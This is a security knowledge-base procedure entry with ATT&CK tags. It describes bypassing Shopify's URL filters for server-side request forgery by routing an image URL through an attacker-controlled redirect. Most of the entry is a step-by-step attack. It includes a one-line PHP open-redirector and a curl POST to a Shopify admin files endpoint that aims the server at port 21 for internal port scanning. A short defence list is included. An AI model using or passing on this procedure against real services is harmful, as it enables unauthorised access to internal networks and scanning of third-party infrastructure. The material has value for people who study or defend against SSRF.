---
tags:
  - ssrf
  - redirection-bypass
  - shopify
type: procedure
tools:
  - '[[tools/Wireshark]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/bypass-url-filters-with-redirection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:02.418Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 790542c8-aa5e-4c46-b32a-26a71c82d486
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-URL-Filters-with-HTTP-Redirection-in-SSRF

## Summary

This procedure exploits the lack of re-validation after HTTP redirects in Shopify's image insertion to bypass scheme and port filters, enabling SSRF to arbitrary targets.

## Description

After initial validation passes for HTTP URLs, the server fetches the image and follows redirects without re-checking the final URL's scheme or port. By using an external redirector (e.g., hettoteam.tk/r.php), attackers can point to valid HTTP initially but redirect to restricted targets like http://target:21. This allows connections from Shopify's internal network to non-standard ports, bypassing client-side filters. Requires control over or knowledge of a redirector service.

## Requirements

1. External redirector server controllable by attacker
2. Authenticated Shopify admin session
3. URL encoding knowledge for parameters

## Defense

Defensive measures and detection strategies:

- Re-validate URLs after all redirects on the server side
- Block or strip redirect chains in image fetching logic
- Monitor for frequent requests to known redirector domains

## Objectives

1. Achieve SSRF by evading initial URL filters
2. Establish internal network connections to restricted ports
3. Set up for port scanning exploitation

## Instructions

### Step 1: Set Up Redirector

**Context**: Configure an external server to redirect to the target URL upon request.

**Command** (Manual setup on redirector):
```bash
# On hettoteam.tk server, create r.php with: header('Location: ' . $_GET['r']); exit;
```

> Ensure the redirector accepts ?r= parameter for target URL.

### Step 2: Send Bypassing Request

**Context**: POST to endpoint with redirector URL in src, encoded.

**Command** ([[commands/bypass-url-filters-with-redirection]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21'
```

> Expected output: 500 if port 21 open, showing bypass success; server connects internally.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/bypass-url-filters-with-redirection]]

## Tools Used

- [[tools/Wireshark]]

## Tags

- ssrf
- redirection-bypass
